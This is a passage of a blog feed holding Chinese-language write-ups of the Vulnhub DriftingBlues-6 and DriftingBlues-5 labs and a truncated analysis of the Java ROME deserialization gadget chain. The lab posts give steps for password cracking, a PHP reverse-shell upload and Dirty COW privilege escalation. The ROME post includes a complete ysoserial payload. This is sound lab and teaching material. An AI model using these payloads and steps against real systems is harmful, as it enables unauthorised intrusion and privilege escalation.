    <link href="https://ke1nys.github.io/posts/194b0b08.html"/>
    <id>https://ke1nys.github.io/posts/194b0b08.html</id>
    <published>2023-04-30T09:31:05.000Z</published>
    <updated>2023-05-03T12:37:29.079Z</updated>
    
    <content type="html"><![CDATA[<p>先扫c段发现靶机</p><p><img src="../images/image-20230430173241641.png" alt="image-20230430173241641"></p><p>然后接着扫一下端口</p><p><img src="../images/image-20230430173357986.png" alt="image-20230430173357986"></p><p>发现只有一个80端口</p><p>于是进行访问</p><p><img src="../images/image-20230430173451936.png" alt="image-20230430173451936"></p><p>然后就先扫一下目录吧</p><p><img src="../images/image-20230430173723541.png" alt="image-20230430173723541"></p><p><img src="../images/image-20230430173738876.png" alt="image-20230430173738876"></p><p>发现给了一个路劲</p><p>然后进行访问</p><p><img src="../images/image-20230430173804181.png" alt="image-20230430173804181"></p><p>这里的话爬虫协议也给了一个提示</p><p><strong>别忘了加上，zip扩展到你的dir brute</strong></p><p>然后在重新爆破一下目录，因为默认字典爆破不出来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://172.16.5.12/ -e php -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100  </span><br></pre></td></tr></table></figure><p><img src="../images/image-20230430174416125.png" alt="image-20230430174416125"></p><p>扫到有个目录，然后进行访问</p><p><img src="../images/image-20230430174504992.png" alt="image-20230430174504992"></p><p>发现下载下来了一个压缩包，但是访问得需要密码，那么我们就开始使用john进行爆破，就是得先把这个玩意转化成john能识别的样子</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用命令：zip2join spammer.zip  &gt;  password.txt</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230430174655867.png" alt="image-20230430174655867"></p><p>然后进行爆破</p><p><img src="../images/image-20230430174724243.png" alt="image-20230430174724243"></p><p>爆破出来了</p><p>然后进行访问</p><p><img src="../images/image-20230430174828847.png" alt="image-20230430174828847"></p><p>发现给了个类似账号密码的东西，然后就开始进行后台登录</p><p><img src="../images/image-20230430174928134.png" alt="image-20230430174928134"></p><p>后台登录成功</p><p>这里就开始找漏洞利用点了</p><p><img src="../images/image-20230430175657042.png" alt="image-20230430175657042"></p><p>这里的话可以进行恶意文件的上传，刚好可以进行shell的反弹</p><p>这里的话就使用php反弹，这里的话kali自带，直接修改使用就行了</p><p><img src="../images/image-20230430191641753.png" alt="image-20230430191641753"></p><p>然后进去修改监听的ip和端口就行了</p><p><img src="../images/image-20230430191753036.png" alt="image-20230430191753036"></p><p>然后开始监听端口</p><p><img src="../images/image-20230430191825803.png" alt="image-20230430191825803"></p><p>然后就去找一下文件的上传地址</p><p><img src="../images/image-20230430191859356.png" alt="image-20230430191859356"></p><p><img src="../images/image-20230430191917306.png" alt="image-20230430191917306"></p><p>然后进行访问</p><p><img src="../images/image-20230430191939612.png" alt="image-20230430191939612"></p><p>反弹成功</p><p>然后进行python交互</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230430192021688.png" alt="image-20230430192021688"></p><p>成功，然后就开始进行提权了</p><p><img src="../images/image-20230430213348387.png" alt="image-20230430213348387"></p><p><strong>内核版本&gt;= 2.6.22</strong> ， 尝试脏牛提权</p><p><a href="https://xz.aliyun.com/t/9757">脏牛提权</a></p><p><img src="../images/image-20230430213803970.png" alt="image-20230430213803970"></p><p>执行 <strong><code>searchsploit 40839</code></strong>    因为这个脏牛就是利用这个来进行提权</p><p><img src="../images/image-20230430214020860.png" alt="image-20230430214020860"></p><p><img src="../images/image-20230430214107311.png" alt="image-20230430214107311"></p><p>然后本地开启一个python服务，把文件传到靶机上</p><p><img src="../images/image-20230430214340317.png" alt="image-20230430214340317"></p><p>成功传上去，然后进行gcc编译</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -pthread 40839.c -o 40839 -lcrypt</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230430214417629.png" alt="image-20230430214417629"></p><p>然后给命令添加最高权限</p><p><strong><code>chmod 777 40839</code></strong></p><p><img src="../images/image-20230430214530349.png" alt="image-20230430214530349"></p><p><img src="../images/image-20230430214743537.png" alt="image-20230430214743537"></p><p>然后就是root用户了</p><p><img src="../images/image-20230430214806980.png" alt="image-20230430214806980"></p><p><strong>总结</strong></p><p>内核版本&gt;= 2.6.22  尝试脏牛提权</p><p>尝试破解加密文件可以考虑先转成john能识别的样子，然后在使用john来进行破解</p><p>s</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;先扫c段发现靶机&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images/image-20230430173241641.png&quot; alt=&quot;image-20230430173241641&quot;&gt;&lt;/p&gt;
&lt;p&gt;然后接着扫一下端口&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../imag</summary>
      
    
    
    
    
    <category term="Vulnhub——DriftingBlues-6" scheme="https://ke1nys.github.io/tags/Vulnhub%E2%80%94%E2%80%94DriftingBlues-6/"/>
    
  </entry>
  
  <entry>
    <title>Vulnhub——DriftingBlues-5</title>
    <link href="https://ke1nys.github.io/posts/80425ab2.html"/>
    <id>https://ke1nys.github.io/posts/80425ab2.html</id>
    <published>2023-04-30T07:46:24.000Z</published>
    <updated>2023-05-03T12:37:29.078Z</updated>
    
    <content type="html"><![CDATA[<p>开始先扫一下c段发现靶机</p><p><img src="../images/image-20230430155615236.png" alt="image-20230430155615236"></p><p>然后开始扫一下端口</p><p><img src="../images/image-20230430155709668.png" alt="image-20230430155709668"></p><p>还是标配两个端口</p><p>进行80端口的访问</p><p><img src="../images/image-20230430155746105.png" alt="image-20230430155746105"></p><p>是一个wordpress cms框架的网页 这里也给了版本</p><p>可以先用wpscan工具去进行扫描</p><p>这里先去找一下后台，用dirb先扫一下这个网址</p><p><img src="../images/image-20230430160144662.png" alt="image-20230430160144662"></p><p><img src="../images/image-20230430160134822.png" alt="image-20230430160134822"></p><p>扫到了后台，那么我们就去用wpcan工具去扫一下网站的用户名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://192.168.205.142 -e u </span><br></pre></td></tr></table></figure><p><img src="../images/image-20230430160547357.png" alt="image-20230430160547357"></p><p>然后使用cewl生成密码字典配合wpscan进行爆破</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl -m 3 -w passwd.txt http://192.168.205.142 </span><br></pre></td></tr></table></figure><p><img src="../images/image-20230430160711724.png" alt="image-20230430160711724"></p><p>-m  是指的密码的最短长度</p><p>然后使用wpcan进行爆破</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://192.168.205.142/ -e u --passwords passwd.txt</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230430161014964.png" alt="image-20230430161014964"></p><p>报出用户名和密码了，接下来进行登录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Username: gill, Password: interchangeable</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230430161140468.png" alt="image-20230430161140468"></p><p>成功进行登录</p><p>于是就开始尝试找漏洞了</p><p><img src="../images/image-20230430161251659.png" alt="image-20230430161251659"></p><p>发现一张网站页面没有的图片，于是尝试把他下载下来进行查看</p><p><img src="../images/image-20230430161407371.png" alt="image-20230430161407371"></p><p>成功下载下来</p><p>这里查看图片得使用这个工具</p><p><strong>exiftool</strong></p><p><img src="../images/image-20230430161620834.png" alt="image-20230430161620834"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get Install exiftool</span><br><span class="line">使用该命令进行安装</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230430162208301.png" alt="image-20230430162208301"></p><p><img src="../images/image-20230430162232774.png" alt="image-20230430162232774"></p><p>发现了ssh的登录密码，于是尝试去进行登录</p><p><img src="../images/image-20230430162333707.png" alt="image-20230430162333707"></p><p>成功进行登录</p><p><img src="../images/image-20230430162354156.png" alt="image-20230430162354156"></p><p>拿到第一个flag，这里有第二个文件，不知道是啥</p><p>直接读的话是乱码</p><p>上网搜索后发现</p><p><img src="../images/image-20230430162524584.png" alt="image-20230430162524584"></p><p><img src="../images/image-20230430163023836.png" alt="image-20230430163023836"></p><p>这里的话是使用scp命令将文件复制到本地进行查看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp gill@192.168.142.149:/home/gill/key* /root</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230430163242074.png" alt="image-20230430163242074"></p><p>成功传输下来</p><p><strong>将 <code>keyfile.kdbx</code> 内容转为 <code>john</code> 支持的格式：<code>keepass2john keyfile.kdbx &gt; Keepasshash.txt</code></strong></p><p><img src="../images/image-20230430163335747.png" alt="image-20230430163335747"></p><p>然后使用john进行密码的爆破</p><p><img src="../images/image-20230430163622503.png" alt="image-20230430163622503"></p><p>爆破出来那个加密文件里的内容了</p><p>将刚才的keyfile.kdbx文件上传到keeWeb, 输入破解出的密码即可打开，得到六个类似密码的字符串</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">链接：https://app.keeweb.info/</span><br></pre></td></tr></table></figure><p>获得了6个密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">2real4surreal </span><br><span class="line">buddyretard</span><br><span class="line">closet313</span><br><span class="line">exalted</span><br><span class="line">fracturedocean</span><br><span class="line">zakkwylde</span><br></pre></td></tr></table></figure><p>然后尝试使用这些密码进行root用户的登录全都失败了</p><p><img src="../images/image-20230430170151033.png" alt="image-20230430170151033"></p><p>这里的话可以利用这个工具来进行使，看一下进程有没有定时执行的任务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kali起个临时服务</span><br><span class="line">靶机下载pspy64: wget http://192.168.111.7/pspy64</span><br><span class="line">给予权限：chmod +x pspy64</span><br><span class="line">执行：./pspy64</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230430170732813.png" alt="image-20230430170732813"></p><p>成功下载下载到靶机上</p><p><img src="../images/image-20230430171115969.png" alt="image-20230430171115969"></p><p>这个任务每隔一分钟就自动执行一次，于是就猜测是会定时执行任务，那么我们就考虑使用他来进行提权了</p><p><img src="../images/image-20230430171233766.png" alt="image-20230430171233766"></p><p>在根目录下发现一个诡异的目录，于是进行查看</p><p>那么猜测是使用他进行提权，这里久刚好用到之前爆破出来的密码了，在查看别人的wp，发现key.sh源码的意思是，如果这个文件下有fracturedocean这个文件的话，就会执行下面的代码，就会把装有root，密码的文件下载下来</p><p><img src="../images/image-20230430171856129.png" alt="image-20230430171856129"></p><p>拿到密码</p><p><img src="../images/image-20230430171951855.png" alt="image-20230430171951855"></p><p>这就是key.sh的文件内容了</p><p><strong>Vulnhub靶机渗透总结：</strong><br>1.cewl 生成字典和wpscan 工具暴力破解的使用<br>2.Exiftool 这个工具用来对EXIF信息解析(第一次了解这个工具的使用和作用)<br>3..kdbx文件密码破解（新知识点，第一次做花的时间比较多）<br>4.如果临时开启不了web服务 可以使用scp 这个命令（非常好用！！）<br>5.解密 keepass 数据库获取密码（虽然没啥用 但是也是第一次了解 新知识点）<br>6.定时提权 下载脚本pspy64 查看 创建key 文件提权</p><p>这里的pspy64可以进行进程的查看(不用root权限)，刚好可以进行判断是否存在定时提权</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;开始先扫一下c段发现靶机&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images/image-20230430155615236.png&quot; alt=&quot;image-20230430155615236&quot;&gt;&lt;/p&gt;
&lt;p&gt;然后开始扫一下端口&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../</summary>
      
    
    
    
    
    <category term="Vulnhub——DriftingBlues-5" scheme="https://ke1nys.github.io/tags/Vulnhub%E2%80%94%E2%80%94DriftingBlues-5/"/>
    
  </entry>
  
  <entry>
    <title>java反序列化-Rome</title>
    <link href="https://ke1nys.github.io/posts/a91085da.html"/>
    <id>https://ke1nys.github.io/posts/a91085da.html</id>
    <published>2023-04-27T12:59:30.000Z</published>
    <updated>2023-05-08T11:14:16.260Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://goodapple.top/archives/1145">参考文章</a></p><p>从零开始分析</p><p>ROME 是一个可以兼容多种格式的 feeds 解析器，可以从一种格式转换成另一种格式，也可返回指定格式或 Java 对象。ROME 兼容了 RSS (0.90, 0.91, 0.92, 0.93, 0.94, 1.0, 2.0), Atom 0.3 以及 Atom 1.0 feeds 格式。</p><p>Rome 提供了 <strong>ToStringBean</strong> 这个类，提供深入的 toString 方法对JavaBean进行操作。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>Idea 新建一个Maven项目</p><p>这里直接到maven包就行了</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.11<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>rome<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>rome<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.javassist<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.28.0-GA<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><p>新建一个demo来进行触发漏洞</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Poc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64_exp</span> <span class="operator">=</span> <span class="string">&quot;BASE64_STRING&quot;</span>;</span><br><span class="line">        <span class="type">byte</span>[] exp =  Base64.getDecoder().decode(base64_exp);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bytes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(exp);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bytes);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230508140800599.png" alt="image-20230508140800599"></p><p>然后关掉 IDEA 的 toString 对象视图, 因为该选项会默认调用实例方法的 toString, 并且会忽略 toString 中设置的断点, 而 ROME 链涉及到 ToStringBean 的 toString 方法</p><p><img src="../images/image-20230508141203769.png" alt="image-20230508141203769"></p><p>利用<code>ysoserial</code>生成弹计算器的<code>payload</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar ROME <span class="string">&#x27;calc&#x27;</span>|base64</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAAAIAAAACc3IAKGNvbS5zdW4uc3luZGljYXRpb24uZmVlZC5pbXBsLk9iamVjdEJlYW6CmQfedgSUSgIAA0wADl9jbG9uZWFibGVCZWFudAAtTGNvbS9zdW4vc3luZGljYXRpb24vZmVlZC9pbXBsL0Nsb25lYWJsZUJlYW47TAALX2VxdWFsc0JlYW50ACpMY29tL3N1bi9zeW5kaWNhdGlvbi9mZWVkL2ltcGwvRXF1YWxzQmVhbjtMAA1fdG9TdHJpbmdCZWFudAAsTGNvbS9zdW4vc3luZGljYXRpb24vZmVlZC9pbXBsL1RvU3RyaW5nQmVhbjt4cHNyACtjb20uc3VuLnN5bmRpY2F0aW9uLmZlZWQuaW1wbC5DbG9uZWFibGVCZWFu3WG7xTNPa3cCAAJMABFfaWdub3JlUHJvcGVydGllc3QAD0xqYXZhL3V0aWwvU2V0O0wABF9vYmp0ABJMamF2YS9sYW5nL09iamVjdDt4cHNyAB5qYXZhLnV0aWwuQ29sbGVjdGlvbnMkRW1wdHlTZXQV9XIdtAPLKAIAAHhwc3EAfgACc3EAfgAHcQB+AAxzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7TAARX291dHB1dFByb3BlcnRpZXN0ABZMamF2YS91dGlsL1Byb3BlcnRpZXM7eHAAAAAA/////3VyAANbW0JL/RkVZ2fbNwIAAHhwAAAAAnVyAAJbQqzzF/gGCFTgAgAAeHAAAAaeyv66vgAAADIAOQoAAwAiBwA3BwAlBwAmAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBa0gk/OR3e8+AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAMSW5uZXJDbGFzc2VzAQA1THlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAJwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAoAQAzeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwEACDxjbGluaXQ+AQARamF2YS9sYW5nL1J1bnRpbWUHACoBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7DAAsAC0KACsALgEABGNhbGMIADABAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAyADMKACsANAEADVN0YWNrTWFwVGFibGUBACB5c29zZXJpYWwvUHduZXIxNjM4NzExMzMzOTc4NzU0MQEAIkx5c29zZXJpYWwvUHduZXIxNjM4NzExMzMzOTc4NzU0MTsAIQACAAMAAQAEAAEAGgAFAAYAAQAHAAAAAgAIAAQAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA0AAAAGAAEAAAAvAA4AAAAMAAEAAAAFAA8AOAAAAAEAEwAUAAIADAAAAD8AAAADAAAAAbEAAAACAA0AAAAGAAEAAAA0AA4AAAAgAAMAAAABAA8AOAAAAAAAAQAVABYAAQAAAAEAFwAYAAIAGQAAAAQAAQAaAAEAEwAbAAIADAAAAEkAAAAEAAAAAbEAAAACAA0AAAAGAAEAAAA4AA4AAAAqAAQAAAABAA8AOAAAAAAAAQAVABYAAQAAAAEAHAAdAAIAAAABAB4AHwADABkAAAAEAAEAGgAIACkACwABAAwAAAAkAAMAAgAAAA+nAAMBTLgALxIxtgA1V7EAAAABADYAAAADAAEDAAIAIAAAAAIAIQARAAAACgABAAIAIwAQAAl1cQB+ABcAAAHUyv66vgAAADIAGwoAAwAVBwAXBwAYBwAZAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBXHmae48bUcYAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAANGb28BAAxJbm5lckNsYXNzZXMBACVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAaAQAjeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb28BABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YS9pby9TZXJpYWxpemFibGUBAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAABAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAAPAAOAAAADAABAAAABQAPABIAAAACABMAAAACABQAEQAAAAoAAQACABYAEAAJcHQABFB3bnJwdwEAeHNyAChjb20uc3VuLnN5bmRpY2F0aW9uLmZlZWQuaW1wbC5FcXVhbHNCZWFu9YoYu+X2GBECAAJMAApfYmVhbkNsYXNzdAARTGphdmEvbGFuZy9DbGFzcztMAARfb2JqcQB+AAl4cHZyAB1qYXZheC54bWwudHJhbnNmb3JtLlRlbXBsYXRlcwAAAAAAAAAAAAAAeHBxAH4AFHNyACpjb20uc3VuLnN5bmRpY2F0aW9uLmZlZWQuaW1wbC5Ub1N0cmluZ0JlYW4J9Y5KDyPuMQIAAkwACl9iZWFuQ2xhc3NxAH4AHEwABF9vYmpxAH4ACXhwcQB+AB9xAH4AFHNxAH4AG3ZxAH4AAnEAfgANc3EAfgAgcQB+ACNxAH4ADXEAfgAGcQB+AAZxAH4ABng=</span><br></pre></td></tr></table></figure><p>然后放入Poc.java里的string    然后进行运行就可以弹出计算器了</p><p><img src="../images/image-20230427213256355.png" alt="image-20230427213256355"></p><p>现在可以对这条链子进行分析</p><h3 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h3><p>老样子我们先去<code>ysoserial</code>中看一下调用链的顺序</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">* TemplatesImpl.getOutputProperties()</span><br><span class="line">* NativeMethodAccessorImpl.invoke0(Method, Object, Object[])</span><br><span class="line">* NativeMethodAccessorImpl.invoke(Object, Object[])</span><br><span class="line">* DelegatingMethodAccessorImpl.invoke(Object, Object[])</span><br><span class="line">* Method.invoke(Object, Object...)</span><br><span class="line">* ToStringBean.toString(String)</span><br><span class="line">* ToStringBean.toString()</span><br><span class="line">* ObjectBean.toString()</span><br><span class="line">* EqualsBean.beanHashCode()</span><br><span class="line">* ObjectBean.hashCode()</span><br><span class="line"></span><br><span class="line">* HashMap&lt;K,V&gt;.hash(Object)</span><br><span class="line">* HashMap&lt;K,V&gt;.readObject(ObjectInputStream)</span><br></pre></td></tr></table></figure><p>最上面的是链子的末尾，最下面的是链子的开头</p><p>在HashMap的readObject里面</p><p><img src="../images/image-20230508144332422.png" alt="image-20230508144332422"></p><p>使用了putVal()方法，然后里面嵌=嵌套着一个hash法，先去看看hash()方法</p><p><img src="../images/image-20230508144501904.png" alt="image-20230508144501904"></p><p>会调用hashcode()方法  这里的key就是ObjectBean这个类了</p><p>然后就在这个类的hashcode()处打个断点</p><p><img src="../images/image-20230508145415802.png" alt="image-20230508145415802"></p><p>然后就开始调试</p><p><img src="../images/image-20230508145754594.png" alt="image-20230508145754594"></p><p>ObjectBean.hashcode调用了EqualsBean.beanHashCode方法</p><p><img src="../images/image-20230508150028029.png" alt="image-20230508150028029"></p><p>然后EqualsBean.beanHashCode又调用了ObjectBean.toString方法  这里的ObjectBean和开头的那个调用hashcode的ObjectBean是同一个类</p><p><img src="../images/image-20230508150156149.png" alt="image-20230508150156149"></p><p>ObjectBean.toString方法又调用了ToStringBean.toString()方法</p><p><img src="../images/image-20230508150301354.png" alt="image-20230508150301354"></p><p>然后跟进这个ToStringBean.toString()这个方法里面</p><p><img src="../images/image-20230508150422220.png" alt="image-20230508150422220"></p><p>在 toString 内部会获取 <code>this._obj</code> 的 Class 对象并获取其名称, 然后设置 prefix 为全类名的最后一位 (即 